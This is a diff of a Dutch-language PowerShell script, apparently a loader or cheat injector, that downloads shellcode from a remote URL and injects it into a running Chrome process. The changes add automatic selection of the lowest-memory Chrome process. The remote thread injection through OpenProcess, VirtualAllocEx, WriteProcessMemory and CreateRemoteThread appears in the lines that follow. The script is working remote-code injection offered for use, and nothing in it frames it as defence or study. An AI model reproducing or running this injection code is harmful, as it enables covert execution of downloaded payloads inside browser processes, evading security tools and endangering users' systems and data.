@@ -6,33 +6,46 @@ if (-not [Environment]::Is64BitProcess) {
 }
 
 Write-Host "---GEMAAKT DOOR MJBP---" -ForegroundColor Cyan
-Write-Host "[+] Zoeken naar Chrome processen.." -ForegroundColor Cyan
+Write-Host "[+] Zoeken naar Chrome processen..." -ForegroundColor Cyan
+
 $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
 
 if (-not $edgeProcesses) {
     Write-Host "[*] Chrome niet gevonden, wordt gestart..." -ForegroundColor Yellow
     Start-Process "chrome"
-    $timeout = 10
-    $elapsed = 0
-    do {
-        Start-Sleep -Seconds 1
-        $elapsed++
-        $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
-    } while (-not $edgeProcesses -and $elapsed -lt $timeout)
-    
-    if (-not $edgeProcesses) {
-        Write-Host "[-] Kon Chrome niet starten!" -ForegroundColor Red
-        pause
-        exit
-    }
-    Write-Host "[+] Chrome succesvol gestart" -ForegroundColor Green
+    Start-Sleep 5
+    $edgeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
 }
 
-# === CORRECTE VERSIE: laagste geheugengebruik ===
-$targetProcess = $edgeProcesses | Sort-Object WorkingSet64 | Select-Object -First 1
-$targetPID = 10684
+if (-not $edgeProcesses) {
+    Write-Host "[-] Kon Chrome niet starten!" -ForegroundColor Red
+    pause
+    exit
+}
 
-Write-Host "[+] Target Chrome gevonden (PID: $targetPID | Geheugen: $([math]::Round($targetProcess.WorkingSet64/1MB, 1)) MB)" -ForegroundColor Green
+# ==================== LIJST VAN ALLE CHROME PROCESSEN ====================
+Write-Host "`n[+] Alle Chrome processen gevonden:" -ForegroundColor Cyan
+Write-Host "-------------------------------------------------------------" -ForegroundColor DarkGray
+
+$edgeProcesses | Sort-Object WorkingSet64 -Descending | ForEach-Object {
+    $memMB = [math]::Round($_.WorkingSet64 / 1MB, 1)
+    $status = if ($_.MainWindowTitle) { " (Hoofdvenster)" } else { "" }
+    Write-Host "   PID: $($_.Id)  |  Geheugen: $memMB MB$status" -ForegroundColor White
+}
+
+Write-Host "-------------------------------------------------------------`n" -ForegroundColor DarkGray
+
+# ==================== LAAGSTE MEMORY SELECTEREN ====================
+$targetProcess = $edgeProcesses | 
+                 Sort-Object WorkingSet64 -Ascending | 
+                 Select-Object -First 1
+
+$targetPID = $targetProcess.Id
+$memoryMB = [math]::Round($targetProcess.WorkingSet64 / 1MB, 1)
+
+Write-Host "[+] Laagste memory proces gekozen!" -ForegroundColor Green
+Write-Host "[+] PID: $targetPID  |  Geheugen: $memoryMB MB" -ForegroundColor Green
+Write-Host ""
 
 try {
     $shellcode = (New-Object Net.WebClient).DownloadData($url)
@@ -61,12 +74,9 @@ Add-Type -MemberDefinition @"
 "@ -Name Win32 -Namespace Native -PassThru
 
 try {
-    $hProcess = [IntPtr]::Zero
-    $PROCESS_ALL_ACCESS = 0x001F0FFF
-    $hProcess = [Native.Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
-    
+    $hProcess = [Native.Win32]::OpenProcess(0x001F0FFF, $false, $targetPID)
     if ($hProcess -eq [IntPtr]::Zero) {
-        throw "OpenProcess mislukt. Run dit script als Administrator!"
+        throw "OpenProcess mislukt. Run als Administrator!"
     }
 
     $addr = [Native.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, 0x3000, 0x40)
@@ -74,24 +84,19 @@ try {
 
     $bytesWritten = [UIntPtr]::Zero
     $success = [Native.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$bytesWritten)
-    if (-not $success -or $bytesWritten.ToUInt64() -ne $size) { throw "WriteProcessMemory mislukt" }
+    if (-not $success) { throw "WriteProcessMemory mislukt" }
 
-    $oldProtect = 0
-    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x20, [ref]$oldProtect) | Out-Null
+    [Native.Win32]::VirtualProtectEx($hProcess, $addr, [uint32]$size, 0x20, [ref]$null) | Out-Null
 
-    $threadId = 0
-    $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
-    if ($hThread -eq [IntPtr]::Zero) {
-        throw "CreateRemoteThread mislukt"
-    }
+    $hThread = [Native.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$null)
+    if ($hThread -eq [IntPtr]::Zero) { throw "CreateRemoteThread mislukt" }
 
-    Write-Host "[+] Gelukt, je kan dit nu afsluiten" -ForegroundColor Green
-    Write-Host "[+] Unload door Chrome venster weg te klikken of END te drukken" -ForegroundColor Yellow
-    Write-Host "[+] LAAT CHROME OPEN STAAN!!!!" -ForegroundColor Red
+    Write-Host "[+] Injectie succesvol in PID $targetPID!" -ForegroundColor Green
+    Write-Host "[+] LAAT DIT PROCES OPEN STAAN!" -ForegroundColor Red
 } catch {
     Write-Host "[-] Injectie mislukt: $($_.Exception.Message)" -ForegroundColor Red
 } finally {
-    if ($hProcess -ne [IntPtr]::Zero) {
-        [Native.Win32]::CloseHandle($hProcess) | Out-Null
-    }
+    if ($hProcess -ne [IntPtr]::Zero) { [Native.Win32]::CloseHandle($hProcess) | Out-Null }
 }
+
+pause
